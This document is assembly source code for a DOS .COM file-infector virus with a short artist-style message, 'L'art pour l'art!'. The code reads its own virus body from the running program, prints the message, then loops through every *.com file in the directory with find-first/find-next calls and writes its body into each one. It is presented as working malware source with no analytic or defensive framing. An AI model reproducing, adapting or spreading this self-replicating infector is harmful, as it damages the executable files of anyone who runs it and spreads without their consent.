	DecrypterLen EQU 950d
	VirusLength  EQU 147d + DecrypterLen
	StartOffset  EQU 0x100 + DecrypterLen

org StartOffset
use16


Start:
	pushad			; Save all registers
	push	ds		; Save Data Segment
	mov	ds,[ds:2Ch]	; for .com program CS=DS=PSP segment
	xor	si,si		; DS:SI points to environment variables

    Skip_Value: 		; After all environment variables, the program's filename is.
	lodsb			; AL=DS:SI
	test	al, al		; 0x0?
	jnz	Skip_Value	; No, skip value

	lodsb			; 2nd 0x0?
	test	al, al		; End of Environment?
	jnz	Skip_Value

	lodsw			; Load amount of additional strings
	cmp	ax, 0x1
	jb	End_Virus


	mov	ah, 0x3D		; Open file
	xor	al, al			; for reading
	mov	dx, si			; Filename
	int	0x21

	xchg	ax, bx			; Filepointer to bx

	pop	ds			; Data Segment gets its standard value again

	mov	ah, 0x3F			; Read from file
	mov	cx, VirusLength 		; Read the whole virus
	mov	dx, Start_Buffer+DecrypterLen	; At the end of the file
	int	0x21

	mov	ah, 0x3E		; Close File
	int	0x21			; Execute it!
	popad				; Restore all registers

	mov	ah, 0x09
	mov	dx, Messenge
	int	0x21


	mov	ah, 0x4E		; Find First File
	xor	al, al
	mov	cx, 0x7 		; File Attribute
	mov	dx, SearchPattern	; Pointer to the search-pattern


   Infection_Loop:
	int	0x21			; Execute it!

	jc	End_Virus

	mov	ax, 0x3D02		; Open File for Writing
	mov	dx, 0x9E		; DTA
	int	0x21			; Execute it!

	mov	bx, ax			; Filehandle to BX

	mov	ah, 0x40		; Write to file
	mov	cx, VirusLength 	; How much to write: Viruslength
	mov	dx, StartOffset+VirusLength   ; What to write: Virus (see 'org ...')
	int	0x21			; Execute it!

	mov	ah, 0x3E		; Close File
	int	0x21			; Execute it!

	mov	ah, 0x4F		; Find Next File
   jmp	Infection_Loop

End_Virus:

nomsg:
	int 0x20

 SearchPattern db '*.com', 0x0
 Messenge db 13,10

	  db "  L'art pour l'art!"
	  db 13,10, 13, 10
	  db "... eicART!"
	  db 13,10,"$"

Start_Buffer:
